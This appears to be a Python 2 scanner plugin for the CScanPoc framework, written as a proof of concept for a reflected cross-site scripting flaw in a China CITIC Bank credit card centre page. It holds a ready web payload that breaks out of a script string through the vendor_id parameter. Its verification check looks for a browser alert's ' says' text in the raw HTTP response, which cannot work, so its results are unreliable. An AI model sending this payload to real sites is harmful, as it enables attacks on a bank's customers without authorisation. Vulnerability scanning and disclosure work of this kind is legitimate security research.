# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'CiticBank_0101' # 平台漏洞编号
    name = '中信银行信用卡中心XSS漏洞(可绕过浏览器xss过滤)' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2016-05-23'  # 漏洞公布时间
    desc = '''模版漏洞描述
    中信银行信用卡中心XSS漏洞(可绕过浏览器xss过滤)
    漏洞地址:https://**.**.**.**/citiccard/ecitic/index.jsp?vendor_id=
    通过查看源码，然后利用，=号后面插入(";alert(/xss/)<!--)。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=192621
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CiticBank'  # 漏洞组件名称
    product_version = 'CiticBank'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e4a2300f-2a8d-4c17-9ad5-0a50d5bcbf1e' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/citiccard/ecitic/index.jsp?vendor_id=";alert(document.domain)<!--'
            url = self.target + payload
            response = requests.get(url)
            if self.target+' says' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()